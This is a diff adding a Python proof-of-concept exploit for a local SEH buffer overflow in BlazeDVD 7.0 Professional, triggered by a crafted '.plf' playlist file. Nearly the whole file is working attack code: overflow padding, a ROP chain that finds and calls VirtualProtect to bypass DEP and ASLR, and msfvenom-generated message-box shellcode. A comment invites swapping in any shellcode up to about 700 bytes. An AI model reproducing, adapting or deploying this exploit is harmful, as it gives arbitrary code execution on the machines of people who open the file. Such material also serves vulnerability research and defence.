@@ -1,0 +1,116 @@
+## Title: BlazeDVD 7.0 Professional - '.plf' Local Buffer Overflow (SEH,ASLR,DEP)
+## Author: emalp
+## Date: 2020-08-31
+## Vendor Homepage: http://www.blazevideo.com/
+## Software Link: http://www.blazevideo.com/download/BlazeDVDProSetup.exe
+## Version: 7.0.0.0
+## Tested on: Windows 7 Home Basic
+
+# Run this file
+# bfile.plf will be generated
+# In blazeDVD open playlist and select bfile.plf
+# a pop up box will appear with text 'emalp'
+
+## Change shellcode according to your needs
+## Shellcode max size is aroung 700 bytes.
+
+# bad chars:
+# \x00, \x0a, \x0b, \x1a
+
+import struct
+
+bfile = open('bfile.plf','w')
+
+buf = 'A'*84
+buf += struct.pack('<L', 0x60325143) # add esp, 0c; ret
+buf += 'AAAA' # ret 04 ting from sehandler
+buf += 'AAAA'*3 # bypassing 12 bytes i.e 0c
+buf += struct.pack('<L', 0x6402091b) # add esp, 200; ret
+buf += 'A'*500
+buf += 'BBBB' # nseh
+buf += struct.pack('<L', 0x640205b1) #sehandler; add esp, 4a0; ret 0x04
+
+#---------------------------------------------------------------------
+# this way we have a lot more space for shellcode.
+buf += 'AAAA'
+# esp lands here.
+#setting up the dynamic pointer for virtual protect
+buf += struct.pack('<L', 0x61640e32) # pop eax; retn.
+buf += struct.pack('<L', 0xffed06a4) # opp of 0012f95c; contains pointer to k32
+buf += struct.pack('<L', 0x603267d4) # neg eax, now eax contains 0012f95c
+buf += struct.pack('<L', 0x616306ed) # mov eax, dword ptr ds:[eax]
+# now eax has the kernel32.dll pointer
+buf += struct.pack('<L', 0x61640f09) # push eax, pop esi, ret 04
+buf += struct.pack('<L', 0x61640e32) # pop eax ret
+buf += 'XXXX' # ret 4 padding
+buf += struct.pack('<L', 0xffff675d) #  neg to 98a3
+buf += struct.pack('<L', 0x603267d4) # neg eax; ret
+# right now eax = 98a3; esi = [0012f95c] = k32.dll val
+buf += struct.pack('<L', 0x6033dcc4) # xchg eax,ecx; xor al,60; ret 
+buf += struct.pack('<L', 0x61644904) # mov eax,esi; pop esi; ret
+buf += 'XXXX' # pop esi padding
+buf += struct.pack('<L', 0x641045f4) # sub eax,ecx
+# now eax has the pointer to VirtualProtect
+#------------------------------------------------------------------------
+
+# SETTING THE REGISTERS FOR VIRTUALPROTECT PARAM
+# SETTING ESI
+buf += struct.pack('<L', 0x61640f09) # push eax, pop esi; ret 4
+# SETTING EBP
+buf += struct.pack('<L', 0x60327f8f) # pop ebp; ret
+buf += 'XXXX' # prev ret 4 padding
+buf += struct.pack('<L', 0x60349b63) # jmp esp
+# SETTING EBX
+buf += struct.pack('<L', 0x61629938) # pop eax; ret
+buf += struct.pack('<L', 0xfffffdff) # neg to 0x201
+buf += struct.pack('<L', 0x6033b16b) # neg eax; ret
+buf += struct.pack('<L', 0x61640124) # xchg eax,ebx
+# SETTING EDX
+buf += struct.pack('<L', 0x616310e8) # pop eax; ret
+buf += struct.pack('<L', 0xffffffc0) # neg of 0x40
+buf += struct.pack('<L', 0x6033b16b) # neg eax; retn
+buf += struct.pack('<L', 0x61608ba2) # xchg eax,edx
+# SETTING ECX
+buf += struct.pack('<L', 0x6404fbb9) # pop ecx; ret
+buf += struct.pack('<L', 0x1001524e) # writable location
+# SETTING EDI
+buf += struct.pack('<L', 0x6032b0b8) # pop edi; ret
+buf += struct.pack('<L', 0x6162e802) # retn (rop nop)
+# SETTING EAX
+buf += struct.pack('<L', 0x6162d638) # pop eax; retn
+buf += struct.pack('<L', 0x90909090) # nop
+# FINALLY PUSHAD
+buf += struct.pack('<L', 0x6033cd4a) # push ad
+
+buf += '\x90\x90\x90\x90'*4
+
+# shellcode generated using:
+# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="emalp"
+#       -b '\x00\x0a\x0b\x1a'
+buf += (
+"\xbb\x42\xa8\xb5\x43\xda\xc7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x41\x83\xc2\x04\x31\x5a\x0f\x03\x5a\x4d\x4a\x40\x9a\xba\x11"
+"\x72\x69\x18\xd2\xb4\x40\xd2\x6d\x86\xad\x76\x19\x99\x1d\xfd"
+"\x6b\x56\xd5\x77\x88\xed\xaf\x7f\x3b\x8f\x0f\xf4\x0d\x48\x1f"
+"\x12\x07\x5b\xc6\x23\x36\x64\x18\x43\x33\xf7\xff\xa7\xc8\x4d"
+"\x3c\x2c\x9a\x65\x44\x33\xc9\xfd\xfe\x2b\x86\x58\xdf\x4a\x73"
+"\xbf\x2b\x05\x08\x74\xdf\x94\xe0\x44\x20\xa7\x3c\x5a\x72\x43"
+"\x7c\xd7\x8c\x8a\xb2\x15\x92\xcb\xa6\xd2\xaf\xaf\x1c\x33\xa5"
+"\xae\xd6\x19\x61\x31\x02\xfb\xe2\x3d\x9f\x8f\xaf\x21\x1e\x7b"
+"\xc4\x5d\xab\x7a\x33\xd4\xef\x58\xdf\x87\x2c\x12\xd7\x6e\x67"
+"\xda\x0d\xf9\x45\xb5\x43\xb7\x47\xaa\x0e\xaf\xc7\xcd\x50\xd0"
+"\x71\x74\xab\x95\xfc\xaf\x51\x9a\x87\x4c\xb2\x0e\x60\xe2\x45"
+"\x51\x8f\x72\xfc\xa5\x18\xe9\x93\x95\x99\x99\x58\xe7\x37\x3e"
+"\xf7\x72\x3b\xdb\x75\x4c\x60\xab\x26\x88\x9c\x25\x30\x86\x5f"
+"\x60\xb9\xaf\x62\xdb\x7a\x07\xc0\x91\xc0\xd0\x19\x0e\x6b\x36"
+"\x7e\xb1\x74\x39\xe9\x22\xf3\x9d\xca\xd4\x62\x7a\x6e\x67\x0d"
+"\xc9\x15\x14\xbe\xe0\x0e\x52\x1c\x26\xbb\xea\x7e\x4e\xcb\xb4"
+"\xa0\xae\x43\x20\xcc\xcf\xff\x9b\xc7\x87\x4c\xf8\xd2\x1e\xad"
+"\x31\x0f\x72\x7d\x63\xfd\x8d\x51\xb2\xc1\x21\xad\xe0\xc9"
+    )
+buf += '\x90\x90\x90\x90'*5
+
+buf += 'E'*200
+
+bfile.write(buf)
+bfile.close()
